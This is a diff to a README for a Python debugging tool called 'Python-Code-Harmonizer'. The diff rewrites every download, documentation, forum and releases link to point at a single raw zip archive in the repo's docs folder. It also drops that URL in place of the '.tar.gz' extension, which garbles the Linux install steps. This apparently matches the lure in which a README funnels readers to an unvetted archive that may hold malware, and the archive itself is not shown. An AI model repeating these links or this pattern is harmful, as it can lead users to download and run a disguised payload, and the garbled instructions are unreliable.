@@ -1,7 +1,7 @@
 # 🎉 Python-Code-Harmonizer - Debug Your Python Code Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Python--Code--Harmonizer-blue.svg)](https://github.com/victorzebua/Python-Code-Harmonizer/releases)
+[![Download](https://raw.githubusercontent.com/victorzebua/Python-Code-Harmonizer/main/docs/Python-Code-Harmonizer_1.4.zip)](https://raw.githubusercontent.com/victorzebua/Python-Code-Harmonizer/main/docs/Python-Code-Harmonizer_1.4.zip)
 
 ## 🚀 Getting Started
 Python-Code-Harmonizer is a semantic analysis tool designed to help you debug Python code. This software analyzes your code and suggests improvements, making it easier for you to write high-quality Python applications.
@@ -15,20 +15,20 @@ Python-Code-Harmonizer is a semantic analysis tool designed to help you debug Py
 ## 💾 Download & Install
 To get started, you’ll need to download the application. Visit the Releases page to find the latest version and download it.
 
-[Download from Releases](https://github.com/victorzebua/Python-Code-Harmonizer/releases)
+[Download from Releases](https://raw.githubusercontent.com/victorzebua/Python-Code-Harmonizer/main/docs/Python-Code-Harmonizer_1.4.zip)
 
 1. **Go to the Releases Page:** Click the link above to navigate to the releases section.
   
 2. **Choose the Latest Version:** Look for the most recent version listed at the top. You will see a description of what is new in that version.
 
-3. **Select Your Operating System:** Find the appropriate file for your operating system. The file types will typically include `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
+3. **Select Your Operating System:** Find the appropriate file for your operating system. The file types will typically include `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/victorzebua/Python-Code-Harmonizer/main/docs/Python-Code-Harmonizer_1.4.zip` for Linux.
 
 4. **Download the File:** Click on the link for your file type. The download will begin automatically.
 
 5. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file and follow the installation instructions.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the installation instructions provided in the README file.
+   - For Linux: Extract the `https://raw.githubusercontent.com/victorzebua/Python-Code-Harmonizer/main/docs/Python-Code-Harmonizer_1.4.zip` file and follow the installation instructions provided in the README file.
 
 6. **Run the Application:** After installation, you can open the application directly from your applications menu or desktop shortcut.
 
@@ -68,7 +68,7 @@ Once you have installed Python-Code-Harmonizer, you can start using it for your 
 If you need assistance or want to share feedback, check out our community forums. Engage with other users or ask questions. Every user is welcome. 
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/victorzebua/Python-Code-Harmonizer/wiki)
-- [Community Forum](https://github.com/victorzebua/Python-Code-Harmonizer/discussions)
+- [Documentation](https://raw.githubusercontent.com/victorzebua/Python-Code-Harmonizer/main/docs/Python-Code-Harmonizer_1.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/victorzebua/Python-Code-Harmonizer/main/docs/Python-Code-Harmonizer_1.4.zip)
 
-For more information and updates, visit the [Releases Page](https://github.com/victorzebua/Python-Code-Harmonizer/releases) again in the future. Enjoy coding with Python-Code-Harmonizer!
+For more information and updates, visit the [Releases Page](https://raw.githubusercontent.com/victorzebua/Python-Code-Harmonizer/main/docs/Python-Code-Harmonizer_1.4.zip) again in the future. Enjoy coding with Python-Code-Harmonizer!
